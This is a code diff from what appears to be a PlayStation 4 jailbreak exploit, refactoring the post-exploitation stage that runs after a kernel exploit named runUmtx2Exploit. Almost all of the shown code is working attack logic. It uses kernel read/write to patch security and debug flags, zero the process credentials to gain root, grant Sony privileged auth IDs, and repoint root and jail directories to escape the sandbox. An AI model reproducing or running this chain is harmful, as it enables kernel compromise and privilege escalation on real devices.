@@ -1,10 +1,3 @@
-//Common chain
-let chain;
-//Bases
-let libSceNKWebKitBase;
-let libSceLibcInternalBase;
-let libKernelBase;
-
 const OFFSET_wk_vtable_first_element     = 0x00269B70;
 const OFFSET_wk_memset_import            = 0x028D8DB0;
 const OFFSET_wk___stack_chk_guard_import = 0x028D8A90;
@@ -684,27 +677,27 @@ async function wait_for_worker() {
     return { p: p2, chain: chain };
 }
 
-var krw = await runUmtx2Exploit(p, chain, log);
+    var krw = await runUmtx2Exploit(p, chain, log);
 
     function get_kaddr(offset) {
-        return kbase.add32(offset);
+        return krw.kbase.add32(offset);
     }
 
     // Set security flags
-    let security_flags = await kernel_read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
-    await kernel_write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);
+    let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
+    await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);
 
     // Set targetid to DEX
-    await kernel_write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);
+    await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);
     // Patch PS4 SDK version  
-    await kernel_write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
+    await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
     
     // Set qa flags and utoken flags for debug menu enable
-    let qaf_dword = await kernel_read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
-    await kernel_write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);
+    let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
+    await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);
 
-    let utoken_flags = await kernel_read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
-    await kernel_write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
+    let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
+    await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
     //showMessage("Debug setting enabled"),
     //debug_log("[+] enabled debug menu");
 
@@ -712,11 +705,11 @@ var krw = await runUmtx2Exploit(p, chain, log);
     let cur_uid = await chain.syscall(SYS_GETUID);
     debug_log("[+] escalating creds (current uid=0x" + cur_uid + ")");
 
-    await kernel_write4(proc_ucred_addr.add32(0x04), 0); // cr_uid
-    await kernel_write4(proc_ucred_addr.add32(0x08), 0); // cr_ruid
-    await kernel_write4(proc_ucred_addr.add32(0x0C), 0); // cr_svuid
-    await kernel_write4(proc_ucred_addr.add32(0x10), 1); // cr_ngroups
-    await kernel_write4(proc_ucred_addr.add32(0x14), 0); // cr_rgid
+    await krw.write4(proc_ucred_addr.add32(0x04), 0); // cr_uid
+    await krw.write4(proc_ucred_addr.add32(0x08), 0); // cr_ruid
+    await krw.write4(proc_ucred_addr.add32(0x0C), 0); // cr_svuid
+    await krw.write4(proc_ucred_addr.add32(0x10), 1); // cr_ngroups
+    await krw.write4(proc_ucred_addr.add32(0x14), 0); // cr_rgid
 
     // Escalate sony privs
     await kernel_write8(proc_ucred_addr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
@@ -729,10 +722,10 @@ var krw = await runUmtx2Exploit(p, chain, log);
     let proc_pdynlib_addr = await kernel_read8(proc_pdynlib_offset);
 
     let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
-    await kernel_write4(restrict_flags_addr, 0);
+    await krw.write4(restrict_flags_addr, 0);
 
     let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
-    await kernel_write8(libkernel_ref_addr, new int64(1, 0));
+    await krw.write8(libkernel_ref_addr, new int64(1, 0));
 
     cur_uid = await chain.syscall(SYS_GETUID);
     debug_log("[+] we root now? uid=0x" + cur_uid);
@@ -741,9 +734,9 @@ var krw = await runUmtx2Exploit(p, chain, log);
     let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
     showMessage("Jailbreaking in sandbox"),
     debug_log("[+] jailbreaking (in sandbox: " + is_in_sandbox + ")");
-    let rootvnode = await kernel_read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
-    await kernel_write8(proc_fd_addr.add32(0x10), rootvnode); // fd_rdir
-    await kernel_write8(proc_fd_addr.add32(0x18), rootvnode); // fd_jdir
+    let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
+    await krw.write8(proc_fd_addr.add32(0x10), rootvnode); // fd_rdir
+    await krw.write8(proc_fd_addr.add32(0x18), rootvnode); // fd_jdir
 
     is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
     debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
